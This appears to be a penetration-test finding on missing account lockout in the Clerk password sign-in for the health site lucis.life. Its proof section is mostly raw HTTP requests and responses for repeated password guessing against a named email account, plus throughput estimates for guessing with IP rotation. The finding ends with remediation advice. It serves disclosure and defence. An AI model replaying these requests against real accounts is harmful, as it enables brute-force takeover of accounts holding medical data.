# F005 -- No Account Lockout on Password Authentication (Brute Force Feasible)

## Summary
The Clerk authentication endpoint for lucis.life does not enforce account lockout after failed password attempts. An attacker can submit unlimited wrong passwords against any account without the account being locked, suspended, or requiring CAPTCHA. While per-IP rate limiting exists (HTTP 429 with Retry-After: 60s), it allows approximately 50-60% of rapid-fire requests through and can be bypassed with IP rotation. The failed-attempt counter resets when a new sign-in attempt is created. After 100+ failed attempts, the account remains fully accessible with all authentication methods intact.

## Endpoint
- **URL**: `POST https://clerk.lucis.life/v1/client/sign_ins/{sign_in_id}/attempt_first_factor`
- **Prerequisite**: `POST https://clerk.lucis.life/v1/client/sign_ins` (creates sign-in attempt, returns sign_in_id and Authorization token)
- **Method**: POST
- **Authentication**: None required (unauthenticated endpoint)
- **Parameters**: `strategy=password&password={guess}`

## Severity
- **Severity**: Medium
- **CVSS**: 5.9 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N)
- **CWE**: CWE-307 (Improper Restriction of Excessive Authentication Attempts)
- **OWASP**: A07:2021 Identification and Authentication Failures

## Impact
- Accounts with weak or common passwords are vulnerable to online brute force attacks
- Rate limiting allows approximately 600 password guesses per hour from a single IP
- With IP rotation (proxies, VPN, botnet), the rate limit is effectively bypassed
- No account lockout means there is no upper bound on total attempts -- only speed is reduced
- Lucis stores sensitive health data (biomarkers, lab results, medical profiles), making account compromise high-impact
- CAPTCHA is disabled in the Clerk configuration, removing an additional defense layer
- The email code verification flow IS properly protected (locks after 3 attempts), but the password flow is not

## Proof

### Step 1: Create sign-in attempt
```
POST /v1/client/sign_ins?_clerk_js_version=5.56.0 HTTP/2
Host: clerk.lucis.life
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0

identifier=peter.bjorn75%40gmail.com
```

Response (HTTP 200):
```json
{
  "response": {
    "object": "sign_in_attempt",
    "id": "sia_3LPPkl6Yljjg0ugnaGaisoQKJy7",
    "status": "needs_first_factor",
    "supported_first_factors": [
      {"strategy": "password"},
      {"strategy": "email_code", "safe_identifier": "peter.bjorn75@gmail.com"},
      {"strategy": "email_link", "safe_identifier": "peter.bjorn75@gmail.com"},
      {"strategy": "reset_password_email_code", "safe_identifier": "peter.bjorn75@gmail.com"}
    ],
    "first_factor_verification": null,
    "identifier": "peter.bjorn75@gmail.com"
  }
}
```

The Authorization header in the response contains the client JWT token needed for subsequent requests.

### Step 2: Submit wrong password (HTTP 422 -- password rejected, no lockout)
```
POST /v1/client/sign_ins/sia_3LPPkl6Yljjg0ugnaGaisoQKJy7/attempt_first_factor?_clerk_js_version=5.56.0 HTTP/2
Host: clerk.lucis.life
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0
Authorization: <client_jwt_from_step_1>

strategy=password&password=WrongPasswordTest!
```

Response (HTTP 422):
```json
{
  "errors": [
    {
      "message": "Password or email address is incorrect. Try again, or use another method.",
      "long_message": "Password or email address is incorrect. Try again, or use another method.",
      "code": "form_password_or_identifier_incorrect",
      "meta": {
        "param_names": ["password", "email_address"]
      }
    }
  ],
  "meta": {
    "client": {
      "sign_in": {
        "status": "needs_first_factor",
        "first_factor_verification": {
          "object": "verification_password",
          "status": "unverified",
          "strategy": "password",
          "attempts": 42,
          "expire_at": null
        }
      },
      "captcha_bypass": false
    }
  }
}
```

Key observations:
- `first_factor_verification.attempts: 42` -- Clerk tracks the count but never triggers lockout
- `first_factor_verification.status: "unverified"` -- never changes to "failed" or "locked" (unlike email_code which locks at 3 attempts)
- `first_factor_verification.expire_at: null` -- no expiration on password verification attempts
- `sign_in.status: "needs_first_factor"` -- sign-in attempt remains active indefinitely
- `captcha_bypass: false` -- yet no CAPTCHA is ever triggered

### Step 3: Rate limiting response (HTTP 429 -- intermittent)
When requests are sent rapidly, some receive HTTP 429:
```json
{
  "errors": [
    {
      "code": "too_many_requests",
      "message": "Too many requests. Please try again in a bit."
    }
  ]
}
```

Headers include `Retry-After: 60`.

### Step 4: Batch test results (100 rapid requests on one sign-in)
```
Test: 100 sequential password attempts on sign-in sia_3LPQFwhAxvqU2xv3Gk2KVmp8Dyj
Duration: ~29 seconds

Attempt  1: HTTP 422 | attempts=1  | status=needs_first_factor
Attempt 10: HTTP 422 | attempts=9  | status=needs_first_factor
Attempt 20: HTTP 422 | attempts=15 | status=needs_first_factor
Attempt 30: HTTP 422 | attempts=25 | status=needs_first_factor
Attempt 40: HTTP 422 | attempts=31 | status=needs_first_factor
Attempt 50: HTTP 422 | attempts=35 | status=needs_first_factor
Attempt 60: HTTP 422 | attempts=37 | status=needs_first_factor

Summary:
  Total 422 (password checked, still active): 54 out of 100
  Total 429 (rate limited):                   46 out of 100
  Account locked:                              NO
  CAPTCHA triggered:                           NO
```

### Step 5: Counter resets with new sign-in attempt
Creating a new sign-in attempt resets the per-session counter:
```
POST /v1/client/sign_ins?_clerk_js_version=5.56.0
-> New sign-in ID: sia_3LPQ06k2ojGzDFYIcQDR2qjqlHu

First password attempt on new sign-in:
  attempts: 1  (reset from 42+)
  status: unverified
```

This means an attacker can rotate sign-in attempts to avoid any per-session tracking.

### Step 6: Account remains accessible after 100+ failed attempts
After all testing (100+ failed password attempts across multiple sessions):
```
POST /v1/client/sign_ins?_clerk_js_version=5.56.0
identifier=peter.bjorn75@gmail.com

Response: HTTP 200
{
  "response": {
    "id": "sia_3LPQKtmccgAcF8YAN7bbk14HOGe",
    "status": "needs_first_factor",
    "supported_first_factors": [
      {"strategy": "password"},
      {"strategy": "email_code"},
      {"strategy": "email_link"},
      {"strategy": "reset_password_email_code"}
    ],
    "first_factor_verification": null
  }
}
```

The account is fully accessible with all authentication methods. No lockout, no suspension, no warning.

### Contrast: Email code verification IS properly limited
For comparison, the email_code verification strategy locks after 3 failed attempts:
```
Attempt 1: HTTP 422 | attempts=1 | status=unverified | err=form_code_incorrect
Attempt 2: HTTP 422 | attempts=2 | status=unverified | err=form_code_incorrect
Attempt 3: HTTP 422 | attempts=3 | status=failed     | err=form_code_incorrect
Attempt 4: HTTP 400 | attempts=3 | status=failed     | err=verification_failed
```

After 3 wrong codes, the verification status changes to "failed" and no further attempts are accepted on that code. This proper lockout mechanism exists for email codes but NOT for passwords.

## Rate Limiting Analysis

| Metric | Value |
|--------|-------|
| Rate limit trigger | ~10-15 requests in rapid succession |
| Retry-After | 60 seconds |
| Leak-through rate | ~50-60% of rapid-fire requests still succeed |
| Per-sign-in lockout | None (counter tracked but never enforced) |
| Per-account lockout | None |
| CAPTCHA | Disabled |
| Estimated throughput (single IP) | ~600 passwords/hour |
| Estimated throughput (10 rotating IPs) | ~6,000 passwords/hour |
| Time to exhaust top-10K passwords (single IP) | ~17 hours |
| Time to exhaust top-10K passwords (10 IPs) | ~1.7 hours |

## Remediation
1. **Enable Clerk's account lockout**: Configure Clerk to lock accounts after N failed password attempts (recommended: 5-10 attempts). Clerk supports this via the dashboard under "User & Authentication > Attack Protection".
2. **Enable CAPTCHA**: Clerk supports Cloudflare Turnstile and hCaptcha integration. Enable it for sign-in attempts to prevent automated attacks.
3. **Enforce per-account rate limiting**: The current rate limit appears to be per-IP only. Add per-account rate limiting that persists across sign-in attempts and IP addresses.
4. **Consider progressive delays**: Implement exponential backoff on failed password attempts per account (e.g., 1s, 2s, 4s, 8s delays).
5. **Monitor and alert**: Set up alerting for accounts with high failed attempt counts (the `attempts` field is already tracked).
6. **Encourage stronger authentication**: Consider promoting or requiring email_code/email_link authentication (which has proper lockout) over password-only authentication.
